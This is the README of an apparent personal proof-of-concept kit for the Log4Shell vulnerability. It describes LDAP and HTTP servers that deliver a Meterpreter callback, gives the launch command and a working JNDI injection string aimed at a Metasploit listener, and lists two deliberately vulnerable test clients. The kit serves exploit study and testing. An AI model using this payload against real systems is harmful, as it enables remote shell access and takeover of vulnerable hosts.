# l4s_poc
Log4Shell (Cve-2021-44228) Proof Of Concept

This is a personal project that runs a simple POC that will host an LDAP
server and an HTTP server for the Log4Shell exploit.  

##Server
The run_servers.py will setup a stripped down meterpreter client that will call
back to the Metasploit instance passed into the ldap request.  **This will run
the meterpreter instance in a thread in the original process that was affected
by the Log4Shell exploit.**

The LDAP server is written in Java and the HTTP server is hosted in python and
will serve from a newly created wwwroot directory.  This does require java,
javac and mvn to build the exploits, and host the LDAP server.  I used Java 8.

Python3 is also required.

####to get started
run python3 run_server.py <your_ip_address> <the_http_port> [ldap_port]

Then pass the jndi string to a vulnerable client to log i.e:
if your host was 10.20.30.40 and your metasploit instance was 20.30.40.50 
listening on port 4444 it would look like this : 
'${jndi:ldap://10.20.30.40:1389/#MM_20_30_40_50_4444}'

##Clients
The clients directory has 2 clients that can be executed.  One is a simple command
line program that will write an error log for whatever the 1st param passed in is.

The other is a basic web server that will write an error log using the log_me
header information.  Note this should be run in an isolted controlled env.
